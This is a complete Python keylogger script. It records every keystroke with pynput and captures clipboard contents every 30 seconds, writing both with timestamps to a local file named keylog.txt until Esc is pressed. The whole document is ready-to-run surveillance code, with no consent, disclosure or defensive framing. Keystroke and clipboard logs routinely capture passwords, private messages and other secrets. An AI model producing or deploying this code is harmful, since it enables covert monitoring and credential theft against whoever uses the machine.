from pynput.keyboard import Key, Listener
import logging
import pyperclip
import threading

# Set up logging to log the keystrokes to a file
log_dir = ""
logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Create a threading event to handle stopping the clipboard logging
stop_event = threading.Event()

# Function to handle key press events
def on_press(key):
    try:
        logging.info(f'{key.char}')
    except AttributeError:
        logging.info(f'{key}')

# Function to handle key release events (optional)
def on_release(key):
    if key == Key.esc:
        # Stop listener and set the event to stop clipboard logging
        stop_event.set()
        return False

# Function to log clipboard content
def log_clipboard():
    try:
        clipboard_content = pyperclip.paste()
        logging.info(f'Clipboard: {clipboard_content}')
    except Exception as e:
        logging.info(f'Clipboard access error: {e}')

# Function to log clipboard content periodically
def log_clipboard_periodically():
    while not stop_event.is_set():
        log_clipboard()
        stop_event.wait(30)  # Wait 30 seconds before logging again

# Start the clipboard logging in a separate thread
clipboard_thread = threading.Thread(target=log_clipboard_periodically)
clipboard_thread.start()

# Set up the listener for keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Wait for the clipboard logging thread to finish
clipboard_thread.join()
